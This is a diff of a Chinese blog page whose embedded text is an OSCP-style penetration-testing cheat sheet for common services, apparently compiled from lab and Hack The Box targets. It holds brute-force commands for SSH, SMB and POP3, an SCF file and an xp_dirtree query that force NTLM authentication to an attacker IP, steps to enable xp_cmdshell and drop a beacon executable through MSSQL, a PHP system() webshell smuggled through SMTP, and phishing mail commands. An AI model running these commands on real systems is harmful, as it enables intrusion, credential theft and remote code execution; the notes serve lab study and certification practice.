@@ -1,4 +1,4 @@
-<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>常见服务 | 养猪日记</title>
+<!doctype html><html lang=en dir=auto><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="noindex, nofollow"><title>常见服务 | 养猪日记</title>
 <meta name=keywords content><meta name=description content="渗透主要遵循高危服务为先的策略，以下为打靶过程中的记录：
 NFS
 挂载：
@@ -80,169 +80,7 @@ hydra -l you -P（此处p为大写，大小写此处代表的意义不同）+字
 enum4linux
 enum4linux -a -o www.harvard.edu
 确定目录可写入：
-先挂载在本地："><meta name=author content="养猪日记"><link rel=canonical href=https://yangzhuzai.github.io/posts/oscp/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1/><link crossorigin=anonymous href=/assets/css/stylesheet.54405a410796490bc874ab6181fac9b675753cc2b91375d8f882566459eca428.css integrity="sha256-VEBaQQeWSQvIdKthgfrJtnV1PMK5E3XY+IJWZFnspCg=" rel="preload stylesheet" as=style><link rel=icon href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://yangzhuzai.github.io/posts/oscp/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="常见服务"><meta property="og:description" content="渗透主要遵循高危服务为先的策略，以下为打靶过程中的记录：
-NFS
-挂载：
-sudo mount -t nfs 192.168.154.130:/home/user/storage ./storage
-
-showmount 
--d：仅显示已被NFS客户端加载的目录； 
--e：显示NFS服务器上所有的共享目录。
-SSH
-爆破
-medusa -h ip -U 文件 -P 文件 -M 协议（ssh） 稳定
-
-crackmapexec ssh ip -u username.txt -p passwd.txt --continue-on 可以使用排除法
-
-./cme -t 1 ssh hosts  -u use_user  -p pass 
-
-hydra -L txt -P txt ip ssh 快
-生成ssh公私钥
-ssh-keygen -t rsa
-
-上传文件名必须为：authorized_keys
-连接问题
-vim ~/.ssh/config 
-HostKeyAlgorithms +ssh-rsa 
-PubkeyAcceptedKeyTypes +ssh-rsa
-FTP
-ftp anonymous@ip
-
-prompt off
-
-切换传输模式： binary ascii
-开关被动模式： passive
-
-put 
-get
-mget
-SMB
-列出信息：
-smbclient -L \\\\{TARGET_IP}\\ -U 用户名
-连接：
-smbclient //ip/目录
-
-SMB扫描工具：
-enum4linux -a -o ip 
-挂载SMB：
-mount -t cifs //<IP地址> 本地目录
-sudo mount -t cifs -o username=&#34;qiu&#34;,password=&#34;password&#34; //192.168.5.103/qiu smb
-
-
-匿名挂载：
-sudo mount -t cifs -o rw,username=guest,password= '//10.10.10.103/Department Shares' smb
-
-SMB罗列：
-smbmap -r 目录 -H ip
-
-批量下载不用确认：
-prompt off
-
-
-使用Kerberos协议登录smb:
-在这种情况需要使用完全限定域名，格式为：hostname.domainname，同时，需要使用impacket工具包的smbclient.py：
-python ../impacket/examples/smbclient.py -k scrm.local/ksimpson:ksimpson@DC1.scrm.local -dc-ip 10.10.11.168
-
-完全限定域名获取方式：
-https://github.com/CroweCybersecurity/ad-ldap-enum.git
-python3 ad-ldap-enum.py -d scrm.local -l 10.10.11.168 -u ksimpson -p ksimpson 
-
-或者使用get-tgt获取票据，然后修改环境变量：
-sudo ntpdate -s 10.10.10.24
-
-python3 ../impacket/examples/getTGT.py absolute.htb/m.lovegod:'AbsoluteLDAP2022!' -dc-ip 10.10.11.181
-
-export KRB5CCNAME=svc_smb.ccache
-
-
-
-爆破：
-hydra -l you -P（此处p为大写，大小写此处代表的意义不同）+字典路径 smb://+靶机ip
-enum4linux
-enum4linux -a -o www.harvard.edu
-确定目录可写入：
-先挂载在本地："><meta property="og:type" content="article"><meta property="og:url" content="https://yangzhuzai.github.io/posts/oscp/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1/"><meta property="og:image" content="https://yangzhuzai.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-10-11T14:25:59+08:00"><meta property="article:modified_time" content="2024-10-11T14:25:59+08:00"><meta property="og:site_name" content="养猪日记"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://yangzhuzai.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="常见服务"><meta name=twitter:description content="渗透主要遵循高危服务为先的策略，以下为打靶过程中的记录：
-NFS
-挂载：
-sudo mount -t nfs 192.168.154.130:/home/user/storage ./storage
-
-showmount 
--d：仅显示已被NFS客户端加载的目录； 
--e：显示NFS服务器上所有的共享目录。
-SSH
-爆破
-medusa -h ip -U 文件 -P 文件 -M 协议（ssh） 稳定
-
-crackmapexec ssh ip -u username.txt -p passwd.txt --continue-on 可以使用排除法
-
-./cme -t 1 ssh hosts  -u use_user  -p pass 
-
-hydra -L txt -P txt ip ssh 快
-生成ssh公私钥
-ssh-keygen -t rsa
-
-上传文件名必须为：authorized_keys
-连接问题
-vim ~/.ssh/config 
-HostKeyAlgorithms +ssh-rsa 
-PubkeyAcceptedKeyTypes +ssh-rsa
-FTP
-ftp anonymous@ip
-
-prompt off
-
-切换传输模式： binary ascii
-开关被动模式： passive
-
-put 
-get
-mget
-SMB
-列出信息：
-smbclient -L \\\\{TARGET_IP}\\ -U 用户名
-连接：
-smbclient //ip/目录
-
-SMB扫描工具：
-enum4linux -a -o ip 
-挂载SMB：
-mount -t cifs //<IP地址> 本地目录
-sudo mount -t cifs -o username=&#34;qiu&#34;,password=&#34;password&#34; //192.168.5.103/qiu smb
-
-
-匿名挂载：
-sudo mount -t cifs -o rw,username=guest,password= '//10.10.10.103/Department Shares' smb
-
-SMB罗列：
-smbmap -r 目录 -H ip
-
-批量下载不用确认：
-prompt off
-
-
-使用Kerberos协议登录smb:
-在这种情况需要使用完全限定域名，格式为：hostname.domainname，同时，需要使用impacket工具包的smbclient.py：
-python ../impacket/examples/smbclient.py -k scrm.local/ksimpson:ksimpson@DC1.scrm.local -dc-ip 10.10.11.168
-
-完全限定域名获取方式：
-https://github.com/CroweCybersecurity/ad-ldap-enum.git
-python3 ad-ldap-enum.py -d scrm.local -l 10.10.11.168 -u ksimpson -p ksimpson 
-
-或者使用get-tgt获取票据，然后修改环境变量：
-sudo ntpdate -s 10.10.10.24
-
-python3 ../impacket/examples/getTGT.py absolute.htb/m.lovegod:'AbsoluteLDAP2022!' -dc-ip 10.10.11.181
-
-export KRB5CCNAME=svc_smb.ccache
-
-
-
-爆破：
-hydra -l you -P（此处p为大写，大小写此处代表的意义不同）+字典路径 smb://+靶机ip
-enum4linux
-enum4linux -a -o www.harvard.edu
-确定目录可写入：
-先挂载在本地："><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://yangzhuzai.github.io/posts/"},{"@type":"ListItem","position":2,"name":"常见服务","item":"https://yangzhuzai.github.io/posts/oscp/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"常见服务","name":"常见服务","description":"渗透主要遵循高危服务为先的策略，以下为打靶过程中的记录：\nNFS 挂载： sudo mount -t nfs 192.168.154.130:/home/user/storage ./storage showmount -d：仅显示已被NFS客户端加载的目录； -e：显示NFS服务器上所有的共享目录。 SSH 爆破 medusa -h ip -U 文件 -P 文件 -M 协议（ssh） 稳定 crackmapexec ssh ip -u username.txt -p passwd.txt --continue-on 可以使用排除法 ./cme -t 1 ssh hosts -u use_user -p pass hydra -L txt -P txt ip ssh 快 生成ssh公私钥 ssh-keygen -t rsa 上传文件名必须为：authorized_keys 连接问题 vim ~/.ssh/config HostKeyAlgorithms +ssh-rsa PubkeyAcceptedKeyTypes +ssh-rsa FTP ftp anonymous@ip prompt off 切换传输模式： binary ascii 开关被动模式： passive put get mget SMB 列出信息： smbclient -L \\\\\\\\{TARGET_IP}\\\\ -U 用户名 连接： smbclient //ip/目录 SMB扫描工具： enum4linux -a -o ip 挂载SMB： mount -t cifs //\u0026lt;IP地址\u0026gt; 本地目录 sudo mount -t cifs -o username=\u0026#34;qiu\u0026#34;,password=\u0026#34;password\u0026#34; //192.168.5.103/qiu smb 匿名挂载： sudo mount -t cifs -o rw,username=guest,password= \u0026#39;//10.10.10.103/Department Shares\u0026#39; smb SMB罗列： smbmap -r 目录 -H ip 批量下载不用确认： prompt off 使用Kerberos协议登录smb: 在这种情况需要使用完全限定域名，格式为：hostname.domainname，同时，需要使用impacket工具包的smbclient.py： python ../impacket/examples/smbclient.py -k scrm.local/ksimpson:ksimpson@DC1.scrm.local -dc-ip 10.10.11.168 完全限定域名获取方式： https://github.com/CroweCybersecurity/ad-ldap-enum.git python3 ad-ldap-enum.py -d scrm.local -l 10.10.11.168 -u ksimpson -p ksimpson 或者使用get-tgt获取票据，然后修改环境变量： sudo ntpdate -s 10.10.10.24 python3 ../impacket/examples/getTGT.py absolute.htb/m.lovegod:\u0026#39;AbsoluteLDAP2022!\u0026#39; -dc-ip 10.10.11.181 export KRB5CCNAME=svc_smb.ccache 爆破： hydra -l you -P（此处p为大写，大小写此处代表的意义不同）+字典路径 smb://+靶机ip enum4linux enum4linux -a -o www.harvard.edu 确定目录可写入： 先挂载在本地：\n","keywords":[],"articleBody":"渗透主要遵循高危服务为先的策略，以下为打靶过程中的记录：\nNFS 挂载： sudo mount -t nfs 192.168.154.130:/home/user/storage ./storage showmount -d：仅显示已被NFS客户端加载的目录； -e：显示NFS服务器上所有的共享目录。 SSH 爆破 medusa -h ip -U 文件 -P 文件 -M 协议（ssh） 稳定 crackmapexec ssh ip -u username.txt -p passwd.txt --continue-on 可以使用排除法 ./cme -t 1 ssh hosts -u use_user -p pass hydra -L txt -P txt ip ssh 快 生成ssh公私钥 ssh-keygen -t rsa 上传文件名必须为：authorized_keys 连接问题 vim ~/.ssh/config HostKeyAlgorithms +ssh-rsa PubkeyAcceptedKeyTypes +ssh-rsa FTP ftp anonymous@ip prompt off 切换传输模式： binary ascii 开关被动模式： passive put get mget SMB 列出信息： smbclient -L \\\\\\\\{TARGET_IP}\\\\ -U 用户名 连接： smbclient //ip/目录 SMB扫描工具： enum4linux -a -o ip 挂载SMB： mount -t cifs // 本地目录 sudo mount -t cifs -o username=\"qiu\",password=\"password\" //192.168.5.103/qiu smb 匿名挂载： sudo mount -t cifs -o rw,username=guest,password= '//10.10.10.103/Department Shares' smb SMB罗列： smbmap -r 目录 -H ip 批量下载不用确认： prompt off 使用Kerberos协议登录smb: 在这种情况需要使用完全限定域名，格式为：hostname.domainname，同时，需要使用impacket工具包的smbclient.py： python ../impacket/examples/smbclient.py -k scrm.local/ksimpson:ksimpson@DC1.scrm.local -dc-ip 10.10.11.168 完全限定域名获取方式： https://github.com/CroweCybersecurity/ad-ldap-enum.git python3 ad-ldap-enum.py -d scrm.local -l 10.10.11.168 -u ksimpson -p ksimpson 或者使用get-tgt获取票据，然后修改环境变量： sudo ntpdate -s 10.10.10.24 python3 ../impacket/examples/getTGT.py absolute.htb/m.lovegod:'AbsoluteLDAP2022!' -dc-ip 10.10.11.181 export KRB5CCNAME=svc_smb.ccache 爆破： hydra -l you -P（此处p为大写，大小写此处代表的意义不同）+字典路径 smb://+靶机ip enum4linux enum4linux -a -o www.harvard.edu 确定目录可写入： 先挂载在本地：\n#!/bin/bash list=$(find /mnt -type d) for d in $list do touch $d/x 2\u003e/dev/null if [ $? -eq 0 ] then echo $d \" is writable\" fi done relay打法，当有目录可写入时可尝试：\n当用户浏览共享时，将自动建立从其系统到 SCF 文件中包含的 UNC 路径的连接。Windows 将尝试使用用户的用户名和密码对该共享进行身份验证。\n.scf是Windows 资源管理器用户访问该文件的目录时打开SMB连接会触发NTLM认证从而获取NET-NETLM HASH pwn.scf文件内容如下\n[Shell] Command=2 IconFile=\\\\10.10.16.8\\share\\pwn.ico [Taskbar] Command=ToggleDesktop nmap smb信息获取：\nls -1 /usr/share/nmap/scripts/smb* smb 命令行操作 开启smb共享：\nhttps://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%80%9A%E8%BF%87%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%BC%80%E5%90%AFWindows%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%8C%BF%E5%90%8D%E8%AE%BF%E9%97%AE%E5%85%B1%E4%BA%AB . .\\Invoke-BuildAnonymousSMBServer.ps1 Invoke-BuildAnonymousSMBServer -Path c:\\inetpub\\wwwroot -Mode Enable 0x04 通过命令行开启可匿名访问的文件共享服务器 具体方法对应的命令如下： 1.启用Guest用户 net user guest /active:yes 2.将Everyone权限应用于匿名用户 REG ADD \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" /v EveryoneIncludesAnonymous /t REG_DWORD /d 1 /f 3.指定匿名共享文件的位置 REG ADD \"HKLM\\System\\CurrentControlSet\\Services\\LanManServer\\Parameters\" /v NullSessionShares /t REG_MULTI_SZ /d smb /f 4.将Guest用户从策略“拒绝从网络访问这台计算机”中移除 导出组策略： secedit /export /cfg gp.inf /quiet 修改文件gp.inf，将SeDenyNetworkLogonRight = Guest修改为SeDenyNetworkLogonRight =，保存 重新导入组策略： secedit /configure /db gp.sdb /cfg gp.inf /quiet 强制刷新组策略，立即生效(否则，重启后生效)： gpupdate/force 5.设置文件共享 icacls c:\\Windows\\System32\\spool\\drivers\\color\\ /T /grant Everyone:r net share share=c:\\Windows\\System32\\spool\\drivers\\color\\ /grant:everyone,full 至此，可匿名访问的文件共享服务器开启成功，访问的地址为///smb net use M: \\\\10.10.125.147\\share /user:smbuser password dir M:\\ MSSQL 连接\nimpacket中的mssqlclient.py 命令： python3 mssqlclient.py domain\\username:password@ip -windows-auth 使用票据登录： export KRB5CCNAME=/home/kali/Desktop/HTB/Scrambled/administrator.ccache mssqlclient.py -k dc1.scrm.local （注意网上下载的可能会无反应） 使用pip安装后尝试： pip install --upgrade impacket 基础语法：\n查询数据库： SELECT name FROM master..sysdatabases; 使用数据库： use xx; 查询表： SELECT name FROM sysobjects WHERE xtype = 'U'; 查询数据： select * from orcharddb.dbo.blog_Orchard_Users_UserPartRecord; relay:\nEXEC MASTER.sys.xp_dirtree '\\\\10.10.14.14\\test', 1, 1 抓的hash可以直接用john破解 john --wordlist=/xx/xx hash.txt xp_cmd EXEC sp_configure 'Show Advanced Options', 1; //允许修改高级参数 reconfigure; EXEC sp_configure 'xp_cmdshell', 1; 开启xp_cmd RECONFIGURE; xp_cmdshell \"whoami\"; 文件落地： xxd -ps beacon.exe hex.txt DECLARE @DATA VARBINARY(MAX) = 0x-hex DECLARE @filepath VARCHAR(MAX) = 'C:\\\\Windows\\\\temp\\\\cs.exe' DECLARE @ObjectToken INT EXEC sp_OACreate 'ADODB.Stream', @ObjectToken OUTPUT EXEC sp_OASetProperty @ObjectToken, 'Type', 1 EXEC sp_OAMethod @ObjectToken, 'Open' EXEC sp_OAMethod @ObjectToken, 'Write', NULL, @DATA EXEC sp_OAMethod @ObjectToken, 'SaveToFile', NULL, @filepath, 2 EXEC sp_OAMethod @ObjectToken, 'Close' EXEC sp_OADestroy @ObjectToken SELECT @filepath mongodb 连接：mongo ip 查看db:show dbs 使用数据库：use 数据库名 查看集合：show collections; 查看集合内容：db.【collection】.find() 枚举数据库中的用户： mongo --port 端口 数据库名称 --eval \"db.admin.find().forEach(printjson);\" 更新数据库内容： mongo --port 27117 ace --eval 'db.admin.update({\"_id\":ObjectId(\"61ce278f46e0fb0012d47ee4\")},{$set:{\"x_shadow\":\"$6$jK3CUz9Ttn4yAf6z$P22Obhi4D4e045xvD4GukfQ6Icrp78/ICMFBnGJyxoS6dUjMYZMZDyosLHtleSdzHbAlbuNciW2tS4kIfUglp.\"}})' PostgreSQL 连接： psql -U 用户名 -h IP -p 端口 列出数据库： \\list 使用数据库： \\c 数据库名称 列出数据库表： \\dt 查询还是select: select * from table; RSYNC 列出可用文件： rsync --list-only {target_IP}:: 复制文件到本地 rsync {target_IP}::public/flag.txt flag.txt TFTP服务 tftp ip port 不支持列出文件，只支持上传下载，多数利用情况下，可以通过其他方式获得显示 get put POP3 110 邮箱服务可爆破或者登录，爆破使用hydra:\nhydra -L username -P passwd ip pop3 登录可使用thunderbird或者NC：\nnc 10.10.10.4 110 user seina 用户 pass scoobydoo2 密码 list 列出邮件 retr 1 查看邮件 SMTP 25 nc 192.168.5.108 25 #连接邮件服务器 helo root #标识用户身份 mail from:\"ROOT \u003c?php system($_GET['a']);?\u003e\" #发件人，木马所在地 rcpt to:root #收件人 data #编辑 . #编辑结束 quit #退出nc swaks工具 swaks --to itsupport@outdated.htb --from car@melo --server mail.outdated.htb --body \"http://10.10.16.4/\" 发送附件： swaks --to nico@megabank.com --from cxk@cxk --server 10.10.10.77 --body \"123\" --attach cxk.rtf sendEmail -f mac@megabank.com -t nico@megabank.com -u \"Invoice Attached\" -m \"You are overdue payment\" -a cxk.rtf -s 10.10.10.77 -v 解释： - `--to itsupport@outdated.htb`: 指定邮件的接收者地址为 `itsupport@outdated.htb`。 - `--from car@melo`: 指定邮件的发件人地址为 `car@melo`。 - `--server mail.outdated.htb`: 指定SMTP服务器的地址为 `mail.outdated.htb`。 - `--body \"http://10.10.16.4/\"`: 指定邮件的正文内容为 \"http://10.10.16.4/\"。这似乎是一个URL，可能是要在邮件正文中包含的链接。 配置账号密码：--auth-user maildmz --auth-password \"DPuBT9tGCBrTbR\" 枚举，由于存在用户名和没有用户名的返回信息不一致，所以可以枚举：脚本如下，使用方式为name+ip #!/usr/bin/python import socket import sys if len(sys.argv) != 3: print(\"Usage: vrfy.py \") sys.exit(0) # Create a Socket s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Connect to the Server ip = sys.argv[2] connect = s.connect((ip,25)) # Receive the banner banner = s.recv(1024) print(banner) # VRFY a user user = (sys.argv[1]).encode() s.send(b'VRFY ' + user + b'\\r\\n') result = s.recv(1024) print(result) # Close the socket s.close() 枚举用户名：\nnmap --script smtp-enum-users ip WinRM远程管理服务 5985/5986端口 使用证书公私钥登录： evil-winrm -i 10.10.11.152 -c cert.pem -k key.pem -S 账号密码登录： evil-winrm -i IP -u user -p passwd -S 下载文件： download xxx xxx 使用kerberos登录： sudo pwsh Install-Module -Name PSWSMan -Scope AllUsers Install-WSMan exit sudo pwsh enter-pssession -computername dc1.scrm.local -Credential MiscSvc@SCRM.LOCAL 或者申请证书： export KRB5CCNAME=./out.ccache evil-winrm -i dc.absolute.htb -r ABSOLUTE.HTB LDAP leapsearch 用户名密码查询 ldapsearch -h 10.10.10.100 -p 389 -D SVC_TGS@active.htb -w GPPstillStandingStrong2k18 anonymous匿名查询查询基本信息： ldapsearch -x -H ldap://10.10.10.161:389 -u '' -w '' -s base namingcontexts 查询域内所有用户名 ldapsearch -x -H ldap://10.10.10.161:389 -u '' -w '' -b \"DC=htb,DC=local\" \"(\u0026(objectCategory=person)(objectClass=user))\" |grep dn awk: ldapsearch -x -H ldap://192.168.224.122:389 -u '' -w '' -b \"DC=hutch,DC=offsec\" \"(\u0026(objectCategory=person)(objectClass=user))\" |grep dn |awk -F 'CN' '{ print $2 }'|awk -F '=' '{ print $2 }'|awk -F ',' '{ print $1 }' \u003e user1.txt 进阶工具： https://github.com/ropnop/windapsearch.git 安装工具： sudo apt-get install libsasl2-dev python3-dev libldap2-dev libssl-dev python3 -m pip install -r requirements.txt 查询用户： ./windapsearch.py -d cascade.local -u '' -p '' -U --dc-ip 10.10.10.182 awk命令： cat user2.txt|grep @hutch.offsec|awk -F ' ' '{ print $2 }' 查询用户所有信息： ./windapsearch.py -d cascade.local -u '' -p '' --dc-ip 10.10.10.182 -U --full kerberos协议登录： 1、借用kinit获取票据： 安装：sudo apt-get install krb5-user 配置文件：/etc/krb5.conf：注意大小写 [libdefaults] default_realm = ABSOLUTE.HTB [realms] ABSOLUTE.HTB = { kdc = dc.absolute.htb } [domain_realm] .absolute.htb = ABSOLUTE.HTB 申请： kinit ksimpson（账户） 查看票据： klist 查询，关键是那个-Y GSSAPI ldapsearch -H ldap://dc.absolute.htb -Y GSSAPI -b \"dc=absolute,dc=htb\" 如果出现报错，可以尝试：sudo apt install libsasl2-modules-gssapi-mit 安装相关环境： sudo apt-cache search libsasl2 sudo apt-get install libsasl2-modules-gssapi-mit 查询objectSid：白银票据利用 ldapsearch -H ldap://dc1.scrm.local -D 'scrm.local\\ksimpson' -w 'ksimpson' -Y GSSAPI -b \"cn=users,dc=scrm,dc=local\" | grep -i \"objectSid::\" | cut -d \":\" -f3 将objectSid转换成sid的脚本： 需要注意的是，后面的-500或者-502 要删除： #!/bin/bash OBJECT_ID=\"AQUAAAAAAAUVAAAAhQSCo0F98mxA04uX9gEAAA==\" #修改这里 G=($(echo -n $OBJECT_ID | base64 -d -i | hexdump -v -e '1/1 \" %02X\"')) BESA2=${G[8]}${G[9]}${G[10]}${G[11]} BESA3=${G[12]}${G[13]}${G[14]}${G[15]} BESA4=${G[16]}${G[17]}${G[18]}${G[19]} BESA5=${G[20]}${G[21]}${G[22]}${G[23]} BERID=${G[24]}${G[25]}${G[26]}${G[27]}${G[28]} rustscan LESA1=${G[2]}${G[3]}${G[4]}${G[5]}${G[6]}${G[7]} LESA2=${BESA2:6:2}${BESA2:4:2}${BESA2:2:2}${BESA2:0:2} LESA3=${BESA3:6:2}${BESA3:4:2}${BESA3:2:2}${BESA3:0:2} LESA4=${BESA4:6:2}${BESA4:4:2}${BESA4:2:2}${BESA4:0:2} LESA5=${BESA5:6:2}${BESA5:4:2}${BESA5:2:2}${BESA5:0:2} LERID=${BERID:6:2}${BERID:4:2}${BERID:2:2}${BERID:0:2} LE_SID_HEX=${LESA1}-${LESA2}-${LESA3}-${LESA4}-${LESA5}-${LERID} # Initial SID value which is used to construct actual SID SID=\"S-1\" # Convert LE_SID_HEX to decimal values and append it to SID as a string IFS='-' read -ra ADDR \u003c\u003c\u003c \"${LE_SID_HEX}\" for OBJECT in \"${ADDR[@]}\"; do SID=${SID}-$((16#${OBJECT})) done echo ${SID} Redis 连接： redis -h ip 密码存储： C:\\Program Files\\Redis\\redis.windows-service.conf type redis.windows-service.conf | findstr requirepass 查询所有内容： keys * 查询指定内容： get xx RPC 登录RPC： rpcclient -U htb\\\\james mantis.htb.local 获取SID： LOOKUPNAMES james（用户名） 空用户： rpcclient -U '' 10.10.10.248 SNMP UDP 161 主要是软件情况\n前置内容：\n1.3.6.1.2.1.25.1.6.0\t系统进程 1.3.6.1.2.1.25.4.2.1.2\t运行程序 1.3.6.1.2.1.25.4.2.1.4\t进程路径 1.3.6.1.2.1.25.2.3.1.4\t存储单元 1.3.6.1.2.1.25.6.3.1.2\t软件名称 1.3.6.1.4.1.77.1.2.25\t用户帐户 1.3.6.1.2.1.6.13.1.3\tTCP 本地端口\n用于获取信息 snmpwalk -c public -v1 -t 10 192.168.50.151 http://www.phreedom.org/software/onesixtyone/ echo public \u003e community echo private \u003e\u003e community echo manager \u003e\u003e community for ip in $(seq 1 254); do echo 192.168.50.$ip; done \u003e ips kali@kali:~$ onesixtyone -c community -i ips 获取机器账户： snmpwalk -c public -v1 192.168.50.151 1.3.6.1.4.1.77.1.2.25 获取正在运行的程序： snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.25.4.2.1.2 获取监听端口： snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.6.13.1.3 枚举整个MIB树 snmpwalk -c public -v1 -t 10 查看扩展信息： snmpwalk -c public -v1 192.168.200.149 NET-SNMP-EXTEND-MIB::nsExtendObjects 敏感信息获取：\nsudo apt-get install snmp-mibs-downloader NetBIOS 139 用于获取信息，用户信息 sudo nbtscan -r 192.168.50.0/24 一些特殊软件： JDWP - Java Debug Wire Protocol 8000端口 aerospike数据库 3000端口 putty RDP 提权 screen-4.5.0 提权 .git githack ","wordCount":"1137","inLanguage":"en","image":"https://yangzhuzai.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E","datePublished":"2024-10-11T14:25:59+08:00","dateModified":"2024-10-11T14:25:59+08:00","author":{"@type":"Person","name":"养猪日记"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://yangzhuzai.github.io/posts/oscp/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1/"},"publisher":{"@type":"Organization","name":"养猪日记","logo":{"@type":"ImageObject","url":"https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://yangzhuzai.github.io/ accesskey=h title="Home (Alt + H)"><img src=https://yangzhuzai.github.io/apple-touch-icon.png alt aria-label=logo height=35>Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://yangzhuzai.github.io/categories/ title=分类><span>分类</span></a></li><li><a href=https://yangzhuzai.github.io/search/ title=搜索><span>搜索</span></a></li><li><a href=https://github.com/yangzhuzai title=Github><span>Github</span>&nbsp;<svg fill="none" shape-rendering="geometricPrecision" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><path d="M15 3h6v6"/><path d="M10 14 21 3"/></svg></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://yangzhuzai.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://yangzhuzai.github.io/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">常见服务</h1><div class=post-meta><span title='2024-10-11 14:25:59 +0800 CST'>October 11, 2024</span>&nbsp;·&nbsp;6 min&nbsp;·&nbsp;1137 words&nbsp;·&nbsp;养猪日记</div></header><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#nfs>NFS</a></li><li><a href=#ssh>SSH</a><ul><li><a href=#爆破>爆破</a></li><li><a href=#生成ssh公私钥>生成ssh公私钥</a></li><li><a href=#连接问题>连接问题</a></li></ul></li><li><a href=#ftp>FTP</a></li><li><a href=#smb>SMB</a></li></ul><ul><li><a href=#mssql>MSSQL</a><ul><li><a href=#xp_cmd>xp_cmd</a></li></ul></li><li><a href=#mongodb>mongodb</a></li><li><a href=#postgresql>PostgreSQL</a></li><li><a href=#rsync>RSYNC</a></li><li><a href=#tftp服务>TFTP服务</a></li><li><a href=#pop3-110>POP3 110</a></li><li><a href=#smtp-25>SMTP 25</a></li><li><a href=#winrm远程管理服务-59855986端口>WinRM远程管理服务 5985/5986端口</a></li><li><a href=#ldap>LDAP</a></li><li><a href=#redis>Redis</a></li><li><a href=#rpc>RPC</a></li><li><a href=#snmp-udp-161>SNMP UDP 161</a></li><li><a href=#netbios-139>NetBIOS 139</a></li></ul></nav></div></details></div><div class=post-content><p>渗透主要遵循高危服务为先的策略，以下为打靶过程中的记录：</p><h2 id=nfs>NFS<a hidden class=anchor aria-hidden=true href=#nfs>#</a></h2><pre tabindex=0><code>挂载：
